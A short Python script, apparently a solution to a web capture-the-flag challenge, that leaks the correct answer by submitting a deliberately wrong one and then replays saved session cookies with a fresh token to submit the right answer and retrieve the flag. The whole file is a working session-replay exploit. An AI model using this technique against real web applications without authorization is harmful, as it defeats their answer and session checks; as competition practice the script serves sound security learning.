import re
import httpx

class FlashSolver:
    def __init__(self, base_url):
        self.client = httpx.Client(base_url=base_url)
        self.cookies = None

    def warmup(self):
        self.client.get('/')
        for _ in range(11):  # 1回 + 10回アクセス
            self.client.get('/flash')

    def get_token_and_answer(self):
        r = self.client.get('/result')
        self.cookies = r.cookies  # セッション保存
        token = re.search(r'[0-9a-f]{32}', r.text).group()

        # 故意に間違った回答で正解を引き出す
        r = self.client.post('/result', data={'token': token, 'answer': 0})
        answer = re.search(r'正解: (\d+)', r.text).group(1)
        return answer

    def submit_correct_answer(self, answer):
        # セッション復元
        self.client.cookies = self.cookies
        r = self.client.get('/result')
        token = re.search(r'[0-9a-f]{32}', r.text).group()

        # 正解を送信
        r = self.client.post('/result', data={'token': token, 'answer': answer})
        return r.text

    def solve(self):
        self.warmup()
        answer = self.get_token_and_answer()
        result = self.submit_correct_answer(answer)
        return result

if __name__ == '__main__':
    solver = FlashSolver('http://challs.tsukuctf.org:50000/')
    flag = solver.solve()
    print(flag)
